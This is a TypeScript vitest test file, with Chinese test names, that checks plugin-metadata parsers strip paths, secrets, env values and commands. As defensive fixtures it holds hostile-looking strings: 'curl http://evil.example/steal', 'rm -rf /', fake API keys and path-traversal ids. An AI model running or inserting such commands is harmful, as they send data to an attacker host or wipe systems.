import { describe, expect, expectTypeOf, it } from 'vitest'
import {
  MANAGED_GROK_PLUGIN_SCOPE,
  MAX_RUNTIME_PLUGIN_DESCRIPTION_LENGTH,
  MAX_RUNTIME_PLUGIN_NAME_LENGTH,
  MAX_RUNTIME_PLUGIN_NAMES,
  RUNTIME_PLUGIN_SCOPES,
  RUNTIME_PLUGIN_STATUSES,
  isRuntimePluginId,
  isRuntimePluginScope,
  isRuntimePluginStatus,
  parseRuntimePluginDetail,
  parseRuntimePluginSummary,
  parseSafePluginDescription,
  parseSkillMarkdownDescription,
  type RuntimePluginDetail,
  type RuntimePluginScope,
  type RuntimePluginStatus,
  type RuntimePluginSummary
} from './runtime-plugin'

const validSummary: RuntimePluginSummary = {
  pluginId: 'demo-plugin',
  displayName: 'Demo Plugin',
  status: 'enabled',
  scope: 'user',
  skillCount: 1,
  mcpCount: 1,
  hookCount: 1,
  version: '1.0.0'
}

const validDetail: RuntimePluginDetail = {
  ...validSummary,
  skillNames: ['summarize'],
  mcpNames: ['docs'],
  hookNames: ['PreToolUse']
}

describe('运行时插件契约', () => {
  it('导出完整作用域、状态和名称上限，本波扫描固定为 user', () => {
    expect(RUNTIME_PLUGIN_SCOPES).toEqual(['user', 'project', 'path'])
    expect(RUNTIME_PLUGIN_STATUSES).toEqual(['enabled', 'disabled', 'invalid'])
    expect(MANAGED_GROK_PLUGIN_SCOPE).toBe('user')
    expect(MAX_RUNTIME_PLUGIN_NAMES).toBe(80)
    expect(MAX_RUNTIME_PLUGIN_NAME_LENGTH).toBe(128)

    expectTypeOf<RuntimePluginScope>().extract<'user'>().not.toBeNever()
    expectTypeOf<RuntimePluginScope>().extract<'project'>().not.toBeNever()
    expectTypeOf<RuntimePluginScope>().extract<'path'>().not.toBeNever()
    expectTypeOf<RuntimePluginStatus>().extract<'disabled'>().not.toBeNever()
    expectTypeOf<RuntimePluginSummary>().toHaveProperty('scope')
    expectTypeOf<RuntimePluginDetail>().toMatchTypeOf<RuntimePluginSummary>()
  })

  it('识别合法 scope / status，拒绝未知值', () => {
    expect(isRuntimePluginScope('user')).toBe(true)
    expect(isRuntimePluginScope('project')).toBe(true)
    expect(isRuntimePluginScope('path')).toBe(true)
    expect(isRuntimePluginScope('workspace')).toBe(false)
    expect(isRuntimePluginScope(null)).toBe(false)

    expect(isRuntimePluginStatus('enabled')).toBe(true)
    expect(isRuntimePluginStatus('disabled')).toBe(true)
    expect(isRuntimePluginStatus('invalid')).toBe(true)
    expect(isRuntimePluginStatus('broken')).toBe(false)
  })

  it('pluginId 拒绝路径分隔符、NUL、父目录片段和空值', () => {
    expect(isRuntimePluginId('demo-plugin')).toBe(true)
    expect(isRuntimePluginId('foo.bar')).toBe(true)
    expect(isRuntimePluginId('')).toBe(false)
    expect(isRuntimePluginId('.')).toBe(false)
    expect(isRuntimePluginId('..')).toBe(false)
    expect(isRuntimePluginId('foo..bar')).toBe(false)
    expect(isRuntimePluginId('a/b')).toBe(false)
    expect(isRuntimePluginId('a\\b')).toBe(false)
    expect(isRuntimePluginId('evil\0name')).toBe(false)
    expect(isRuntimePluginId('x'.repeat(4097))).toBe(false)
  })

  it('摘要解析丢弃 path、manifest、env、command 等敏感或越权字段', () => {
    expect(
      parseRuntimePluginSummary({
        ...validSummary,
        path: '/Users/me/.grok/plugins/demo-plugin',
        manifest: { name: 'raw', env: { API_KEY: 'sk-secret' } },
        env: { API_KEY: 'sk-secret' },
        command: 'curl http://evil.example/steal',
        extra: true
      })
    ).toEqual(validSummary)
  })

  it('摘要解析拒绝非法字段类型，合法项可省略 version', () => {
    expect(parseRuntimePluginSummary(null)).toBeNull()
    expect(parseRuntimePluginSummary([])).toBeNull()
    expect(parseRuntimePluginSummary({ ...validSummary, pluginId: 'a/b' })).toBeNull()
    expect(parseRuntimePluginSummary({ ...validSummary, status: 'broken' })).toBeNull()
    expect(parseRuntimePluginSummary({ ...validSummary, scope: 'workspace' })).toBeNull()
    expect(parseRuntimePluginSummary({ ...validSummary, skillCount: -1 })).toBeNull()
    expect(parseRuntimePluginSummary({ ...validSummary, mcpCount: 1.5 })).toBeNull()
    expect(
      parseRuntimePluginSummary({
        pluginId: 'demo-plugin',
        displayName: 'Demo Plugin',
        status: 'enabled',
        scope: 'user',
        skillCount: 0,
        mcpCount: 0,
        hookCount: 0
      })
    ).toEqual({
      pluginId: 'demo-plugin',
      displayName: 'Demo Plugin',
      status: 'enabled',
      scope: 'user',
      skillCount: 0,
      mcpCount: 0,
      hookCount: 0
    })
  })

  it('详情解析保留名称列表，丢弃 hook 命令和 MCP env，计数与名称对齐', () => {
    const parsed = parseRuntimePluginDetail({
      ...validDetail,
      path: '/tmp/secret-plugin',
      env: { TOKEN: 'sk-secret-key' },
      command: 'rm -rf /',
      mcpServers: { docs: { command: 'npx', env: { TOKEN: 'sk-secret-key' } } },
      hooks: { PreToolUse: [{ command: 'curl http://evil.example' }] },
      skillNames: ['summarize', 'x'.repeat(MAX_RUNTIME_PLUGIN_NAME_LENGTH + 1), ''],
      mcpNames: ['docs'],
      hookNames: ['PreToolUse']
    })

    expect(parsed).toEqual({
      ...validSummary,
      skillCount: 1,
      mcpCount: 1,
      hookCount: 1,
      skillNames: ['summarize'],
      mcpNames: ['docs'],
      hookNames: ['PreToolUse']
    })
    expect(JSON.stringify(parsed)).not.toContain('sk-secret-key')
    expect(JSON.stringify(parsed)).not.toContain('curl http://evil.example')
    expect(JSON.stringify(parsed)).not.toContain('/tmp/secret-plugin')
  })

  it('详情名称超过 80 项时截断，并跳过超长名称', () => {
    const overflow = Array.from({ length: MAX_RUNTIME_PLUGIN_NAMES + 5 }, (_, index) => `n${index}`)
    const parsed = parseRuntimePluginDetail({
      ...validDetail,
      skillNames: overflow,
      mcpNames: overflow,
      hookNames: overflow,
      skillCount: overflow.length,
      mcpCount: overflow.length,
      hookCount: overflow.length
    })

    expect(parsed).not.toBeNull()
    expect(parsed!.skillNames).toHaveLength(MAX_RUNTIME_PLUGIN_NAMES)
    expect(parsed!.mcpNames).toHaveLength(MAX_RUNTIME_PLUGIN_NAMES)
    expect(parsed!.hookNames).toHaveLength(MAX_RUNTIME_PLUGIN_NAMES)
    expect(parsed!.skillCount).toBe(MAX_RUNTIME_PLUGIN_NAMES)
    expect(parsed!.mcpCount).toBe(MAX_RUNTIME_PLUGIN_NAMES)
    expect(parsed!.hookCount).toBe(MAX_RUNTIME_PLUGIN_NAMES)
    expect(parsed!.skillNames[0]).toBe('n0')
    expect(parsed!.skillNames.includes(`n${MAX_RUNTIME_PLUGIN_NAMES}`)).toBe(false)
  })

  it('摘要可带安全说明，丢弃绝对路径和 NUL', () => {
    expect(
      parseRuntimePluginSummary({
        ...validSummary,
        description: '  Create and edit documents  '
      })
    ).toMatchObject({ description: 'Create and edit documents' })
    expect(
      parseRuntimePluginSummary({
        ...validSummary,
        description: '/Users/me/secret.md'
      })
    ).toEqual(validSummary)
    expect(parseSafePluginDescription('skills/dyp-ask.md is a helper')).toBe(
      'skills/dyp-ask.md is a helper'
    )
    expect(
      parseSafePluginDescription('x'.repeat(MAX_RUNTIME_PLUGIN_DESCRIPTION_LENGTH + 8))
    ).toHaveLength(MAX_RUNTIME_PLUGIN_DESCRIPTION_LENGTH)
  })

  it('从 SKILL.md 取 description，不要把标题当说明', () => {
    expect(
      parseSkillMarkdownDescription(`---
name: summarize
description: 把长文压成要点
---

# summarize
`)
    ).toBe('把长文压成要点')
    expect(parseSkillMarkdownDescription('# outline\n\n生成文档大纲。\n')).toBe('生成文档大纲。')
    expect(parseSkillMarkdownDescription('# only-title\n')).toBeUndefined()
  })

  it('详情可带 skillDescriptions，且只保留已有 skillNames 的安全说明', () => {
    const parsed = parseRuntimePluginDetail({
      ...validDetail,
      skillDescriptions: {
        summarize: '把长文压成要点',
        ghost: '不该出现',
        '': 'empty'
      }
    })
    expect(parsed?.skillDescriptions).toEqual({ summarize: '把长文压成要点' })
  })

  it('invalidReason 只在 status 为 invalid 时保留为短字符串', () => {
    expect(
      parseRuntimePluginDetail({
        ...validDetail,
        status: 'enabled',
        invalidReason: '不该出现'
      })?.invalidReason
    ).toBeUndefined()

    expect(
      parseRuntimePluginDetail({
        ...validDetail,
        status: 'invalid',
        skillCount: 0,
        mcpCount: 0,
        hookCount: 0,
        skillNames: [],
        mcpNames: [],
        hookNames: [],
        invalidReason: '插件目录指向了受管 Grok Home 之外的位置。',
        version: undefined
      })
    ).toMatchObject({
      status: 'invalid',
      invalidReason: '插件目录指向了受管 Grok Home 之外的位置。'
    })
  })
})
